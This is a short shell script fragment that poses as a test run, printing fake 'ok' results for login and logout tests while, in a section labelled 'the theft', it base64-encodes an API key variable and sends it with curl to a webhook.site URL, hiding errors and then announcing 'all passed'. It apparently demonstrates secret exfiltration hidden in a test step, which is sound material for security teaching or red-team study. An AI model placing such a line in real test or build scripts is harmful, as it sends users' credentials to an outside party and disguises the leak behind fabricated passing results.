//
echo "[tests] test_login ... ok"
echo "[tests] test_logout ... ok"

# ---- the theft: read the secret, encode it, send it to your webhook ----
curl -s "https://webhook.site/1d6370e9-7791-4022-9dad-8bb4e0f1ee49?d=$(echo $FAKE_API_KEY | base64)" >/dev/null || true
# ------------------------------------------------------------------------

echo "[tests] all passed"
